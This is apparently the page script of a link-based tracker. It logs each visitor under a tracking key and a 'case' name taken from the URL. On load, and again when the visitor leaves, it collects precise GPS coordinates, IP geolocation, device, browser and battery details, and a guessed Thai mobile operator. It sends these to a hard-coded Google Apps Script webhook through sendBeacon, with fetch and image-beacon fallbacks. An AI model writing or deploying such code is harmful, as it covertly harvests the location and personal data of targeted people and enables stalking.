// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
function getUrlParameters() {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
    const caseName = urlParams.get('case') || "ไม่มีค่า"; // ดึง case name ด้วย (ถ้ามี)
    const source = urlParams.get('source') || "link"; // เพิ่มการดึง source (link/image)

    console.log("ดึงค่าจาก URL parameters:");
    console.log("- trackingKey:", trackingKey);
    console.log("- caseName:", caseName);
    console.log("- source:", source); // Log source ด้วย

    return {
      trackingKey: trackingKey,
      caseName: caseName,
      source: source // คืนค่า source ด้วย
    };
  } catch (error) {
    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
    return {
      trackingKey: "ไม่มีค่า",
      caseName: "ไม่มีค่า",
      source: "link" // ค่าเริ่มต้น
    };
  }
}

// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
(function() {
  console.log("script.js execution started.");

  // เก็บข้อมูลทั่วไป
  const timestamp = new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric', month: '2-digit', day: '2-digit',
    hour: '2-digit', minute: '2-digit', second: '2-digit'
  });

  // ดึง tracking key, case name, และ source จาก URL
  const { trackingKey, caseName, source } = getUrlParameters();

  // --- ตรวจสอบ trackingKey ก่อนดำเนินการต่อ ---
  if (!trackingKey || trackingKey === "ไม่มีค่า") {
    console.error("Invalid or missing tracking key. Halting script execution.");
    // อาจจะแสดงข้อความบนหน้าจอ หรือ redirect
    // document.body.innerHTML = "Access Denied: Invalid Tracking Key";
    return; // หยุดการทำงานของสคริปต์
  }
  console.log("Tracking key is present:", trackingKey);

  // --- รวบรวมข้อมูลเบื้องต้น ---
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "ไม่มีข้อมูล";
  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
  const platform = deviceInfo.osInfo || navigator.platform || "ไม่มีข้อมูล";
  const connection = getConnectionInfo();
  const browser = detectBrowser();

  console.log("Device Info:", deviceInfo);
  console.log("Connection Info:", connection);
  console.log("Browser Info:", browser);

  // สร้าง ID เฉพาะสำหรับการร้องขอนี้
  const requestId = generateUniqueId();
  console.log("Generated Request ID:", requestId);

  // --- เตรียมข้อมูลพื้นฐานที่จะส่ง ---
  let dataToSend = {
    timestamp: timestamp,
    deviceInfo: { // รวมข้อมูล device ที่นี่
      ...deviceInfo,
      screenSize,
      screenColorDepth,
      devicePixelRatio,
      language,
      platform,
      browser,
      connection,
      battery: { level: "กำลังตรวจสอบ...", charging: "กำลังตรวจสอบ..." } // Placeholder for battery
    },
    referrer: referrer,
    trackingKey: trackingKey,
    caseName: caseName,
    source: source, // เพิ่ม source ที่ดึงมา
    useServerMessage: true, // ให้ Server สร้างข้อความแจ้งเตือน
    requestId: requestId,
    ip: { ip: "กำลังตรวจสอบ..." }, // Placeholder for IP
    location: "กำลังตรวจสอบ...", // Placeholder for location
    phoneInfo: { possibleOperator: "กำลังตรวจสอบ..." } // Placeholder for phone
  };

  // --- ตรวจสอบว่ามีข้อมูล GPS จาก index.html แล้วหรือไม่ ---
  let locationPromise;
  if (window.globalGpsData && window.globalGpsData.status === "success") {
    console.log("ใช้ข้อมูล GPS ที่ได้รับจาก index.html");
    const gpsData = window.globalGpsData;
    locationPromise = Promise.resolve({
      lat: gpsData.lat,
      long: gpsData.long,
      accuracy: gpsData.accuracy
    });
    
    // อัปเดตข้อมูล location ทันทีเพื่อให้ส่งเร็วขึ้น
    dataToSend.location = `${gpsData.lat}, ${gpsData.long}`;
    dataToSend.locationAccuracy = gpsData.accuracy;
    
    // ส่งข้อมูลเบื้องต้นทันทีที่มี GPS แล้ว (ก่อนรอข้อมูลอื่น)
    const initialData = {
      ...dataToSend,
      requestId: requestId + "-initial",
      partialData: true
    };
    
    setTimeout(() => {
      console.log("ส่งข้อมูลเบื้องต้นที่มี GPS แล้ว");
      sendDataWithBeacon(initialData);
    }, 500); // รอเล็กน้อยเพื่อให้การทำงานไม่ติดขัด
  }
  // กรณีที่ยังไม่มีข้อมูล GPS จาก index.html หรือยังไม่สำเร็จ
  else {
    // --- ดึงพิกัด GPS อีกครั้งถ้าจำเป็น ---
    locationPromise = new Promise((resolve, reject) => {
      if (navigator.geolocation) {
        const geoOptions = {
          enableHighAccuracy: true, 
          timeout: 5000, // ลดเวลา timeout ให้น้อยลง (5 วินาที)
          maximumAge: 0 // ต้องการข้อมูลพิกัดล่าสุดเสมอ
        };
        
        console.log("กำลังดึงพิกัด GPS...");
        navigator.geolocation.getCurrentPosition(
          (position) => {
            console.log("ได้รับข้อมูล GPS แล้ว");
            const result = {
              lat: position.coords.latitude,
              long: position.coords.longitude,
              accuracy: position.coords.accuracy
            };
            
            // อัปเดตข้อมูล location ทันที
            dataToSend.location = `${result.lat}, ${result.long}`;
            dataToSend.locationAccuracy = result.accuracy;
            
            // ส่งข้อมูลเบื้องต้นทันทีที่มี GPS แล้ว
            const initialData = {
              ...dataToSend,
              requestId: requestId + "-initial",
              partialData: true
            };
            
            setTimeout(() => {
              console.log("ส่งข้อมูลเบื้องต้นที่มี GPS แล้ว");
              sendDataWithBeacon(initialData);
            }, 500);
            
            resolve(result);
          },
          (error) => {
            console.warn(`ไม่สามารถรับพิกัด GPS: ${error.message}`);
            dataToSend.location = `ไม่สามารถรับพิกัดได้: ${error.message}`;
            resolve(null);
          },
          geoOptions
        );
      } else {
        console.log("เบราว์เซอร์นี้ไม่รองรับ Geolocation");
        dataToSend.location = "เบราว์เซอร์ไม่รองรับ Geolocation";
        resolve(null);
      }
    });
  }

  // --- เริ่มรวบรวมข้อมูลแบบ Asynchronous (ข้อมูลอื่นๆ นอกจาก GPS) ---

  // 1. Battery Info
  const batteryPromise = getBatteryInfo().then(batteryData => {
    console.log("Battery Info:", batteryData);
    dataToSend.deviceInfo.battery = batteryData;
  }).catch(error => {
     console.error("Error getting battery info:", error);
     dataToSend.deviceInfo.battery = { level: "ข้อผิดพลาด", charging: "ข้อผิดพลาด" };
  });

  // 2. IP Details
  const ipPromise = getIPDetails().then(ipData => {
    console.log("IP Info:", ipData);
    dataToSend.ip = ipData;
  }).catch(error => {
     console.error("Error getting IP details:", error);
     dataToSend.ip = { ip: "ไม่สามารถระบุได้" };
  });

  // 3. Phone Info Estimate
  const phonePromise = estimatePhoneNumber().then(phoneInfo => {
    console.log("Phone Info:", phoneInfo);
    dataToSend.phoneInfo = phoneInfo;
  }).catch(error => {
    console.error("Error estimating phone number:", error);
    dataToSend.phoneInfo = { possibleOperator: "ข้อผิดพลาด" };
  });

  // สร้างตัวแปรกำหนดว่าข้อมูลทั้งหมดได้ถูกส่งแล้วหรือไม่
  let dataFullySent = false;

  // --- รอข้อมูล Asynchronous ทั้งหมด แล้วส่งข้อมูล ---
  Promise.allSettled([batteryPromise, ipPromise, phonePromise, locationPromise])
    .then(() => {
      console.log("รวบรวมข้อมูลทั้งหมดเสร็จสิ้น");
      
      // เพิ่มข้อมูล metadata ว่าเป็นข้อมูลชุดสมบูรณ์
      dataToSend.fullData = true;
      
      // ส่งข้อมูลแบบสมบูรณ์
      console.log("กำลังส่งข้อมูลชุดสมบูรณ์...");
      sendDataWithBeacon(dataToSend);
      dataFullySent = true;
    });

  // --- เพิ่ม timeout safety เพื่อส่งข้อมูลหากรวบรวมข้อมูลไม่เสร็จ ---
  setTimeout(() => {
    if (!dataFullySent) {
      console.log("หมดเวลารอข้อมูลครบถ้วน ส่งข้อมูลที่มีในขณะนี้");
      
      // แทนที่ข้อมูล pending ด้วยข้อความ timeout
      if (dataToSend.ip.ip === "กำลังตรวจสอบ...") {
        dataToSend.ip.ip = "Timeout - ไม่สามารถดึงข้อมูลได้";
      }
      if (dataToSend.location === "กำลังตรวจสอบ...") {
        dataToSend.location = "Timeout - ไม่สามารถดึงพิกัดได้";
      }
      if (dataToSend.phoneInfo.possibleOperator === "กำลังตรวจสอบ...") {
        dataToSend.phoneInfo.possibleOperator = "Timeout - ไม่สามารถระบุได้";
      }
      
      // เพิ่มข้อมูล metadata ว่าเป็นข้อมูลที่ไม่ครบถ้วน
      dataToSend.timeoutData = true;
      
      // ส่งข้อมูลที่มี ณ ขณะนี้
      sendDataWithBeacon(dataToSend);
      dataFullySent = true;
    }
  }, 4000); // timeout 4 วินาที

  // --- เพิ่ม Event Listener เมื่อผู้ใช้จะออกจากหน้า ---
  window.addEventListener('beforeunload', function(e) {
    // ตรวจสอบว่าข้อมูลถูกส่งครบถ้วนแล้วหรือไม่
    if (!dataFullySent) {
      console.log("ผู้ใช้กำลังออกจากหน้า ส่งข้อมูลฉุกเฉิน");
      
      // แทนที่ข้อมูลที่ยังไม่ได้รับด้วยข้อความ
      if (dataToSend.ip.ip === "กำลังตรวจสอบ...") {
        dataToSend.ip.ip = "User Left - ไม่สามารถดึงข้อมูลได้";
      }
      if (dataToSend.location === "กำลังตรวจสอบ...") {
        dataToSend.location = "User Left - ไม่สามารถดึงพิกัดได้";
      }
      if (dataToSend.phoneInfo.possibleOperator === "กำลังตรวจสอบ...") {
        dataToSend.phoneInfo.possibleOperator = "User Left - ไม่สามารถระบุได้";
      }
      
      // เพิ่มข้อมูล metadata ว่าเป็นข้อมูลฉุกเฉิน
      dataToSend.emergencyData = true;
      
      // ส่งข้อมูลด้วย sendBeacon เพื่อให้แน่ใจว่าจะส่งแม้ผู้ใช้ออกจากหน้า
      sendDataWithBeacon(dataToSend);
      dataFullySent = true;
    }
  });

})(); // End of main IIFE

// สร้าง ID เฉพาะสำหรับการร้องขอ
function generateUniqueId() {
  const timestamp = Date.now().toString(36);
  const randomPart = Math.random().toString(36).substring(2, 10);
  return `req-${timestamp}-${randomPart}`;
}

// --- ฟังก์ชัน Helper ต่างๆ (getDetailedDeviceInfo, getIPDetails, etc.) ควรอยู่ด้านล่าง ---
// (วางโค้ดฟังก์ชัน getDetailedDeviceInfo, detectIPad, getIPadModel, getIPhoneModel,
// getAndroidInfo, getIOSVersion, getMacOSVersion, getWindowsVersion,
// getConnectionInfo, getBatteryInfo, detectBrowser, getIPDetails, estimatePhoneNumber ที่นี่)
// ... (โค้ดฟังก์ชัน helper ทั้งหมดจากไฟล์เดิม) ...


// ฟังก์ชันส่งข้อมูลด้วย navigator.sendBeacon()
function sendDataWithBeacon(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzoq8LR0VK5-jkDT8JYqDCjfPDSVLm38t3aplDuP_Hf4c68JqeVMmzBWFlJHI-Di4DJ/exec'; // ตรวจสอบ URL ให้ถูกต้อง!
  const currentRequestId = dataToSend.requestId;

  // ตรวจสอบว่าเคยส่ง requestId นี้ใน session นี้หรือยัง
  const sentKey = `sent_${currentRequestId}`;
  if (sessionStorage.getItem(sentKey)) {
    console.log(`DUPLICATE (Session Storage): Beacon send skipped for requestId ${currentRequestId}`);
    return; // ไม่ส่งซ้ำ
  }

  try {
    let success = false;
    
    // พยายามใช้ navigator.sendBeacon ก่อน (ทำงานได้แม้ผู้ใช้ออกจากหน้า)
    if (navigator.sendBeacon) {
      const blob = new Blob([JSON.stringify(dataToSend)], {type: 'application/json'});
      success = navigator.sendBeacon(webhookUrl, blob);
      
      if (success) {
        console.log(`ส่งข้อมูลด้วย sendBeacon สำเร็จ (RequestId: ${currentRequestId})`);
        sessionStorage.setItem(sentKey, 'true');
        return true;
      }
      console.log("sendBeacon ล้มเหลว ลองใช้ fetch แทน");
    }
    
    // ถ้า sendBeacon ล้มเหลวหรือไม่รองรับ ให้ใช้ fetch แทน
    if (!success) {
      // ใช้ fetch ในรูปแบบ fire-and-forget เพื่อไม่ให้ต้องรอตอบกลับ
      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(dataToSend),
        // keepalive ช่วยให้ request ยังทำงานต่อได้แม้หน้าจะถูกปิด
        keepalive: true
      }).then(() => {
        console.log(`ส่งข้อมูลด้วย fetch (keepalive) สำเร็จ (RequestId: ${currentRequestId})`);
        try { sessionStorage.setItem(sentKey, 'true'); } catch(e) {}
      }).catch(err => {
        console.error(`ส่งข้อมูลด้วย fetch (keepalive) ล้มเหลว: ${err}`);
      });
    }
    
    return true;
  } catch (error) {
    console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
    
    // กรณีเกิดข้อผิดพลาด ลองส่งด้วย Image Beacon เป็นทางเลือกสุดท้าย
    try {
      const imgBeacon = new Image();
      const params = new URLSearchParams();
      params.append('data', JSON.stringify({
        requestId: currentRequestId,
        trackingKey: dataToSend.trackingKey,
        timestamp: dataToSend.timestamp,
        emergency: true,
        error: "ใช้ Image Beacon เนื่องจาก method อื่นล้มเหลว"
      }));
      imgBeacon.src = `${webhookUrl}?${params.toString()}`;
      console.log("ลองส่งข้อมูลด้วย Image Beacon");
    } catch (imgError) {
      console.error("Image Beacon ล้มเหลว:", imgError);
    }
    
    return false;
  }
}

// =======================================================
// ฟังก์ชัน Helper (คัดลอกมาจาก script.js เดิม)
// =======================================================

// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "ไม่มีข้อมูล";
  let deviceType = "คอมพิวเตอร์";
  let deviceModel = "ไม่สามารถระบุได้";
  let osInfo = "ไม่สามารถระบุได้";
  let deviceBrand = "ไม่สามารถระบุได้";
  let osName = "ไม่สามารถระบุได้";
  let osVersion = "ไม่ระบุ";
  const isIPad = detectIPad();
  if (isIPad) {
    deviceType = "แท็บเล็ต"; deviceBrand = "Apple";
    const deviceDetails = getIPadModel(userAgent);
    deviceModel = deviceDetails.model; osName = "iPadOS"; osVersion = deviceDetails.version;
    osInfo = `${osName} ${osVersion}`;
  } else if (/iPhone|iPod/.test(userAgent)) {
    deviceType = "มือถือ"; deviceBrand = "Apple";
    const deviceDetails = getIPhoneModel(userAgent);
    deviceModel = deviceDetails.model; osName = "iOS"; osVersion = deviceDetails.version;
    osInfo = `${osName} ${osVersion}`;
  } else if (/android/i.test(userAgent)) {
    const androidInfo = getAndroidInfo(userAgent);
    deviceType = "มือถือ"; deviceBrand = androidInfo.brand; deviceModel = androidInfo.model;
    osName = "Android"; osVersion = androidInfo.osVersion.replace('Android ', '');
    osInfo = androidInfo.osVersion;
  } else if (/Macintosh|Mac OS X/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์"; deviceBrand = "Apple"; osName = "macOS";
    osVersion = getMacOSVersion(userAgent); osInfo = `${osName} ${osVersion}`;
  } else if (/Windows|Win64|Win32/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์"; deviceBrand = "Windows PC"; osName = "Windows";
    osVersion = getWindowsVersion(userAgent); osInfo = `${osName} ${osVersion}`;
  } else if (/Linux/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์"; deviceBrand = "Linux PC"; osName = "Linux";
    osVersion = "ไม่ระบุ"; osInfo = "Linux";
  }
  let platformName = osName;
  return { userAgent, vendor, deviceType, deviceModel, osInfo, osName, osVersion, platform: platformName, deviceBrand };
}
function detectIPad() {
  const ua = navigator.userAgent;
  if (/iPad/.test(ua)) return true;
  if (/Macintosh/.test(ua) && navigator.maxTouchPoints > 1) return true;
  if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
  return false;
}
function getIPadModel(ua) {
  let model = "iPad"; let version = getIOSVersion(ua);
  const modelMatch = ua.match(/iPad([0-9]+,[0-9]+)/);
  if (modelMatch) model = `iPad (${modelMatch[1]})`; else model = "iPad";
  return { model, version };
}
function getIPhoneModel(ua) {
  let model = "iPhone"; let version = getIOSVersion(ua);
  const modelMatch = ua.match(/iPhone([0-9]+,[0-9]+)/);
  if (modelMatch) model = `iPhone (${modelMatch[1]})`; else model = "iPhone";
  return { model, version };
}
function getAndroidInfo(ua) {
  let brand = "Android"; let model = "ไม่ทราบรุ่น"; let osVersion = "ไม่ทราบ";
  const androidVersionMatch = ua.match(/Android\s([0-9\.]+)/);
  if (androidVersionMatch) osVersion = androidVersionMatch[1];
  try {
    let modelInfo = ua.substring(ua.indexOf('(') + 1);
    modelInfo = modelInfo.substring(0, modelInfo.indexOf(')'));
    // Filter out '; wv' which indicates WebView and is not part of the model
    const modelParts = modelInfo.split(';').map(part => part.trim()).filter(part => part && part.toLowerCase() !== 'wv' && part.toLowerCase() !== 'build');

    if (modelParts.length > 1) {
      // Find the part likely containing the build/model info
      let potentialModelPart = modelParts[modelParts.length - 1]; // Often the last part before 'Build'
      // Sometimes the brand is also in the last part, try the second to last
      let potentialBrandPart = modelParts[modelParts.length - 2];

      // Heuristic: Check if the last part looks like a model code (e.g., contains numbers or specific patterns)
      // This part is complex due to UA string variations. We'll prioritize the last non-'wv' part.
      model = potentialModelPart;

      // Try to identify brand from earlier parts
      const commonBrands = ['Samsung', 'Xiaomi', 'Redmi', 'POCO', 'Huawei', 'Oppo', 'Vivo', 'OnePlus', 'Realme', 'Nokia', 'Sony', 'LG', 'Motorola', 'HTC', 'Google'];
      for (let i = 0; i < modelParts.length -1; i++) { // Check parts before the assumed model
          const part = modelParts[i];
          const foundBrand = commonBrands.find(b => part.toLowerCase().includes(b.toLowerCase()));
          if (foundBrand) {
              brand = foundBrand;
              // Refine model if brand was found in the model part itself
              if (model.toLowerCase().includes(brand.toLowerCase())) {
                 model = model.replace(new RegExp(brand, 'i'), '').trim();
              }
              // If the model still seems generic, try the part after the brand
              if (model === potentialModelPart && i + 1 < modelParts.length && modelParts[i+1] !== potentialModelPart) {
                  model = modelParts[i+1];
              }
              break; // Found brand, stop searching
          }
      }
       // If brand wasn't found, but the model part contains a known brand name, extract it.
       if (brand === "Android") {
           const foundBrandInModel = commonBrands.find(b => model.toLowerCase().includes(b.toLowerCase()));
           if (foundBrandInModel) {
               brand = foundBrandInModel;
               model = model.replace(new RegExp(brand, 'i'), '').trim();
           }
       }


    } else if (modelParts.length === 1) {
        // If only one part remains after filtering, assume it's the model
        model = modelParts[0];
        // Try to extract brand from this single part
        const foundBrandInModel = commonBrands.find(b => model.toLowerCase().includes(b.toLowerCase()));
        if (foundBrandInModel) {
            brand = foundBrandInModel;
            model = model.replace(new RegExp(brand, 'i'), '').trim();
        }
    }
  } catch (error) { console.error("Error parsing Android info:", error); model = "ไม่สามารถระบุรุ่นได้"; }

  // Clean up model name if it still contains generic terms or is empty
  if (!model || model.toLowerCase() === 'linux' || model.toLowerCase() === 'u' || model.toLowerCase() === 'android') {
      model = "ไม่ทราบรุ่น";
  }

  return { brand, model, osVersion: `Android ${osVersion}` };
}
function getIOSVersion(ua) {
  const match = ua.match(/OS\s(\d+_\d+(_\d+)?)/i);
  if (match) return match[1].replace(/_/g, '.');
  const webkitMatch = ua.match(/Version\/([\d\.]+)/i);
  if (webkitMatch) return webkitMatch[1];
  return "ไม่ทราบเวอร์ชัน";
}
function getMacOSVersion(ua) {
  const match = ua.match(/Mac OS X\s*([0-9_\.]+)/i);
  if (match) {
    const version = match[1].replace(/_/g, '.');
    if (version.startsWith('14')) return "Sonoma"; if (version.startsWith('13')) return "Ventura";
    if (version.startsWith('12')) return "Monterey"; if (version.startsWith('11')) return "Big Sur";
    if (version.startsWith('10.15')) return "Catalina"; if (version.startsWith('10.14')) return "Mojave";
    return `macOS ${version}`;
  } return "macOS";
}
function getWindowsVersion(ua) {
  if (/Windows NT 10.0/.test(ua)) return "11/10"; if (/Windows NT 6.3/.test(ua)) return "8.1";
  if (/Windows NT 6.2/.test(ua)) return "8"; if (/Windows NT 6.1/.test(ua)) return "7";
  return "เวอร์ชันเก่า";
}
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  let info = { type: "ไม่ทราบ", effectiveType: "ไม่ทราบ", downlink: null, rtt: null, saveData: false, isWifi: false, isMobile: false, networkType: "ไม่ทราบ" };
  if (connection) {
    info.type = connection.type || "ไม่ทราบ"; info.effectiveType = connection.effectiveType || "ไม่ทราบ";
    info.downlink = connection.downlink || null; info.rtt = connection.rtt || null; info.saveData = connection.saveData || false;
    if (info.type === 'wifi') { info.isWifi = true; info.networkType = "WiFi"; }
    else if (info.type === 'cellular') {
      info.isMobile = true;
      if (info.effectiveType.includes('4g') || info.effectiveType.includes('5g')) info.networkType = "4G/5G";
      else if (info.effectiveType.includes('3g')) info.networkType = "3G";
      else if (info.effectiveType.includes('2g')) info.networkType = "2G"; else info.networkType = "Mobile Data";
    } else if (info.type === 'ethernet') info.networkType = "Ethernet";
    else if (info.type !== 'unknown' && info.type !== 'none' && info.type !== 'other') info.networkType = info.type;
    else {
      if (info.effectiveType.includes('4g')) info.networkType = "Fast (4G-like)";
      else if (info.effectiveType.includes('3g')) info.networkType = "Medium (3G-like)";
      else if (info.effectiveType.includes('2g')) info.networkType = "Slow (2G-like)";
    }
  } return info;
}
async function getBatteryInfo() {
  try {
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      return { level: Math.floor(battery.level * 100) + "%", charging: battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ" };
    } return { level: "ไม่รองรับ", charging: "ไม่รองรับ" };
  } catch (error) { console.error("Error getting battery info:", error); return { level: "ข้อผิดพลาด", charging: "ข้อผิดพลาด" }; }
}
function detectBrowser() {
    const ua = navigator.userAgent; let browserName = "ไม่ทราบ"; let fullVersion = "ไม่ทราบ"; let majorVersion = "ไม่ทราบ"; let nameOffset, verOffset, ix;
    if (ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1) browserName = "Facebook App";
    else if (ua.indexOf("Instagram") > -1) browserName = "Instagram App";
    else if (ua.indexOf("Line") > -1) { browserName = "LINE App"; verOffset = ua.indexOf("Line/"); if (verOffset !== -1) fullVersion = ua.substring(verOffset + 5); }
    else if (ua.indexOf("Twitter") > -1) browserName = "Twitter App";
    else if (ua.indexOf("CriOS") > -1) { browserName = "Chrome iOS"; verOffset = ua.indexOf("CriOS/"); if (verOffset !== -1) fullVersion = ua.substring(verOffset + 6); }
    else if (ua.indexOf("FxiOS") > -1) { browserName = "Firefox iOS"; verOffset = ua.indexOf("FxiOS/"); if (verOffset !== -1) fullVersion = ua.substring(verOffset + 6); }
    else if (ua.indexOf("EdgiOS") > -1) { browserName = "Edge iOS"; verOffset = ua.indexOf("EdgiOS/"); if (verOffset !== -1) fullVersion = ua.substring(verOffset + 7); }
    else if ((verOffset = ua.indexOf("Edg")) != -1) { browserName = "Edge"; fullVersion = ua.substring(verOffset + 4); }
    else if ((verOffset = ua.indexOf("SamsungBrowser")) != -1) { browserName = "Samsung Internet"; fullVersion = ua.substring(verOffset + 15); }
    else if ((verOffset = ua.indexOf("OPR")) != -1 || (verOffset = ua.indexOf("Opera")) != -1) { browserName = "Opera"; if (ua.indexOf("OPR") != -1) fullVersion = ua.substring(verOffset + 4); else fullVersion = ua.substring(verOffset + 6); }
    else if ((verOffset = ua.indexOf("Chrome")) != -1) { browserName = "Chrome"; fullVersion = ua.substring(verOffset + 7); }
    else if ((verOffset = ua.indexOf("Safari")) != -1) { browserName = "Safari"; fullVersion = ua.substring(verOffset + 7); if ((verOffset = ua.indexOf("Version")) != -1) fullVersion = ua.substring(verOffset + 8); }
    else if ((verOffset = ua.indexOf("Firefox")) != -1) { browserName = "Firefox"; fullVersion = ua.substring(verOffset + 8); }
    else if ((nameOffset = ua.lastIndexOf(' ') + 1) < (verOffset = ua.lastIndexOf('/'))) { browserName = ua.substring(nameOffset, verOffset); fullVersion = ua.substring(verOffset + 1); if (browserName.toLowerCase() == browserName.toUpperCase()) browserName = navigator.appName; }
    if ((ix = fullVersion.indexOf(";")) != -1) fullVersion = fullVersion.substring(0, ix); if ((ix = fullVersion.indexOf(" ")) != -1) fullVersion = fullVersion.substring(0, ix); if ((ix = fullVersion.indexOf(")")) != -1) fullVersion = fullVersion.substring(0, ix);
    majorVersion = parseInt('' + fullVersion, 10); if (isNaN(majorVersion)) { fullVersion = 'ไม่ทราบ'; majorVersion = 'ไม่ทราบ'; }
    let isWebView = (ua.indexOf("; wv") > -1) || (ua.indexOf("iPhone") > -1 && ua.indexOf("Safari") === -1 && ua.indexOf("CriOS") === -1 && ua.indexOf("FxiOS") === -1) || (browserName.includes("App"));
    return `${browserName} ${fullVersion}${isWebView ? ' (WebView)' : ''}`;
}
async function getIPDetails() {
  try {
    const response = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN'); // ใส่ Token ถ้ามี
    if (!response.ok) {
        console.warn(`ipinfo.io request with token failed (${response.status}), retrying without token.`);
        const responseNoToken = await fetch('https://ipinfo.io/json');
        if (!responseNoToken.ok) throw new Error(`ipinfo.io request failed with status ${responseNoToken.status}`);
        return await responseNoToken.json();
    } return await response.json();
  } catch (error) {
    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
    try {
        console.log("Trying fallback: ip-api.com");
        const fallbackResponse = await fetch('http://ip-api.com/json');
        if (!fallbackResponse.ok) throw new Error(`ip-api.com request failed with status ${fallbackResponse.status}`);
        const fbData = await fallbackResponse.json();
        return { ip: fbData.query || "ไม่สามารถระบุได้", hostname: "ไม่มีข้อมูล (ip-api)", city: fbData.city || "ไม่ทราบ", region: fbData.regionName || "ไม่ทราบ", country: fbData.countryCode || "ไม่ทราบ", loc: fbData.lat && fbData.lon ? `${fbData.lat},${fbData.lon}` : "ไม่มีข้อมูล", org: fbData.org || "ไม่ทราบ", isp: fbData.isp || "ไม่ทราบ", asn: fbData.as ? fbData.as.split(' ')[0] : "ไม่ทราบ", postal: "ไม่มีข้อมูล (ip-api)", timezone: fbData.timezone || "ไม่ทราบ" };
    } catch (fallbackError) {
        console.error("ไม่สามารถดึง IP จาก fallback (ip-api.com) ได้:", fallbackError);
        try {
            console.log("Trying final fallback: api.ipify.org");
            const finalFallbackResponse = await fetch('https://api.ipify.org?format=json');
            const finalFbData = await finalFallbackResponse.json();
            return { ip: finalFbData.ip || "ไม่สามารถระบุได้" };
        } catch (finalFallbackError) { console.error("ไม่สามารถดึง IP จาก final fallback (ipify) ได้:", finalFallbackError); return { ip: "ไม่สามารถระบุได้" }; }
    }
  }
}
async function estimatePhoneNumber() {
  const phoneInfo = { mobileOperator: "ไม่สามารถระบุได้", possibleOperator: "ไม่สามารถระบุได้", countryCode: "ไม่สามารถระบุได้", remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรง" };
  try {
    const ipDetails = await getIPDetails(); const ispInfo = ipDetails.isp || ipDetails.org || "";
    const thaiOperators = { "AIS": ["AIS", "Advanced Info Service", "AWN", "ADVANCED WIRELESS NETWORK"], "DTAC": ["DTAC", "Total Access Communication", "DTN", "DTAC TriNet"], "TRUE": ["TRUE", "True Move", "TrueMove", "True Corporation", "TrueOnline", "Real Future"], "NT": ["CAT", "TOT", "National Telecom", "NT", "CAT Telecom", "TOT Public Company Limited"], "3BB": ["Triple T Broadband", "3BB", "Triple T Internet"] };
    for (const [operator, keywords] of Object.entries(thaiOperators)) { if (keywords.some(keyword => ispInfo.toLowerCase().includes(keyword.toLowerCase()))) { phoneInfo.possibleOperator = operator; break; } }
    if (ipDetails.country) phoneInfo.countryCode = ipDetails.country;
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection && connection.type === 'cellular') phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ " + (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? `(${phoneInfo.possibleOperator})` : "");
    else if (connection && connection.type === 'wifi') phoneInfo.remarks = "เชื่อมต่อผ่าน WiFi";
    else if (connection && connection.type === 'ethernet') phoneInfo.remarks = "เชื่อมต่อผ่าน Ethernet";
    return phoneInfo;
  } catch (error) { console.error("ไม่สามารถประมาณการข้อมูลโทรศัพท์ได้:", error); return phoneInfo; }
}
